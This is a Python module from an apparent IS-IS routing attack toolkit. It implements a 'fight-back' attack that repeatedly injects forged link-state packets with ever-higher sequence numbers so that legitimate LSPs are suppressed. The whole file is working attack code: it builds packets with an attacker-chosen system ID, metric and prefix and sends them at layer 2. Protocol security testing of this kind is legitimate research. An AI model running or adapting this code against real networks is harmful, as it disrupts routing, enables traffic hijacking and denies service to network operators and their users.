from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender

MAX_ISIS_SEQ = 0xFFFFFFFF


class FightBackAttack(BaseAttack):
    name = "fight-back"
    description = "持续注入递增序列号的对抗 LSP 阻止合法 LSP 传播"
    category = AttackCategory.LSP
    needs_repeated = True
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        self._seq = max(self.config.sequence, 1)

    def send_one_round(self) -> bool:
        if self._seq < MAX_ISIS_SEQ:
            self._seq += 1
        else:
            self._seq = 1
        lsp_id = self.config.lsp_id or f"{self.config.sys_id}.00-00"
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id, lsp_id=lsp_id,
            src_mac=self._src_mac, level=self.config.level,
            sequence=self._seq, remaining_lifetime=1200,
            metric=self.config.metric,
            network_addr=self.config.network_addr,
            network_mask=self.config.network_mask,
        )
        return self._sender.send_l2(pkt)

    def launch(self) -> AttackResult:
        ok = self.send_one_round()
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Fight-Back 攻击: seq={self._seq}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 1
